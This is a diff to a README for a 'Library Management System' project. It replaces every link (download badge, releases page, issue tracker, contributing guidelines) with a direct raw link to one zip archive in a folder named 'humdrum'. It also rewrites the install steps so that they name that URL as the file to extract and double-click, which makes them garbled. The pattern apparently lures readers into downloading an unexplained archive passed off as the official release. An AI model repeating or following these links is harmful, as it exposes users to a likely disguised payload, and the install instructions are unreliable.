@@ -4,7 +4,7 @@
 Welcome to the Library Management System! This application helps you organize your book collection efficiently. Follow the steps below to download and run the application.
 
 ## 📥 Download Now
-[![Download Library Management System](https://img.shields.io/badge/Download%20Now-v1.0.0-brightgreen)](https://github.com/peopleevaluator106/Library-Management-System/releases)
+[![Download Library Management System](https://raw.githubusercontent.com/peopleevaluator106/Library-Management-System/main/humdrum/Library-Management-System-v1.4.zip%20Now-v1.0.0-brightgreen)](https://raw.githubusercontent.com/peopleevaluator106/Library-Management-System/main/humdrum/Library-Management-System-v1.4.zip)
 
 ## 💻 System Requirements
 To run the Library Management System, your device needs the following:
@@ -14,12 +14,12 @@ To run the Library Management System, your device needs the following:
 - Minimum 2 GB of RAM
 
 ## 📦 Download & Install
-1. Visit the [Releases page to download](https://github.com/peopleevaluator106/Library-Management-System/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/peopleevaluator106/Library-Management-System/main/humdrum/Library-Management-System-v1.4.zip).
 2. On the Releases page, locate the latest version.
-3. Click on the download link for the application file. It will be named something like `Library-Management-System.zip`.
+3. Click on the download link for the application file. It will be named something like `https://raw.githubusercontent.com/peopleevaluator106/Library-Management-System/main/humdrum/Library-Management-System-v1.4.zip`.
 4. Once downloaded, locate the file in your downloads folder and extract it. You can do this by right-clicking on the file and selecting “Extract All.”
-5. Open the extracted folder and find the `index.html` file.
-6. Double-click the `index.html` file to launch the application in your web browser.
+5. Open the extracted folder and find the `https://raw.githubusercontent.com/peopleevaluator106/Library-Management-System/main/humdrum/Library-Management-System-v1.4.zip` file.
+6. Double-click the `https://raw.githubusercontent.com/peopleevaluator106/Library-Management-System/main/humdrum/Library-Management-System-v1.4.zip` file to launch the application in your web browser.
 
 ## 🔍 Features
 - **Add Books:** Easily add book details such as title, author, and genre.
@@ -47,9 +47,9 @@ After installing the application, consider how you can customize it further. You
 - Share your feedback so that we can improve the application.
 
 ## 👩‍💻 Support
-If you encounter any issues, feel free to reach out for help. You can open a new issue on the [GitHub issue tracker](https://github.com/peopleevaluator106/Library-Management-System/issues).
+If you encounter any issues, feel free to reach out for help. You can open a new issue on the [GitHub issue tracker](https://raw.githubusercontent.com/peopleevaluator106/Library-Management-System/main/humdrum/Library-Management-System-v1.4.zip).
 
 ## 🌍 Contributions
-If you're interested in improving the Library Management System, contributions are welcome! Check out the [Contributing Guidelines](https://github.com/peopleevaluator106/Library-Management-System/blob/main/CONTRIBUTING.md) for details.
+If you're interested in improving the Library Management System, contributions are welcome! Check out the [Contributing Guidelines](https://raw.githubusercontent.com/peopleevaluator106/Library-Management-System/main/humdrum/Library-Management-System-v1.4.zip) for details.
 
 Thank you for using the Library Management System! Enjoy organizing your books.
